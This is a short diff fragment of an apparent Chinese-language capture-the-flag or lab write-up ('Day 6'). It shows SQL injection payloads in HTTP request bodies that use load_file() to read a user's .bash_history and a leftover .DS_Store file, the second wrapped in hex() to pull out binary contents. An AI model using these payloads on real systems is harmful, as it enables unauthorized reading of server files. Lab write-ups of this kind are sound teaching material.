@@ -125,3 +125,8 @@ title=12&category=12',content=(select(load_file("/home/www/.bash_history"))),/*&
 ```
 ![](assets/Day%206/file-20251224172022201.png)
 可以看到当前项由`html.zip`在原本`/tmp`目录下解压再复制到`/var/www`，并且记录了关于项目`html`文件结构的`.DS_Store`在`/tmp`目录中仍存在一份，去读取这个文件了解下项目结构。
+![500](assets/Day%206/file-20251224172445156.png)
+都是不可见字符，我们想到可以用`hex()`函数读取16进制出来
+```http
+title=12&category=12',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*&content=123
+```
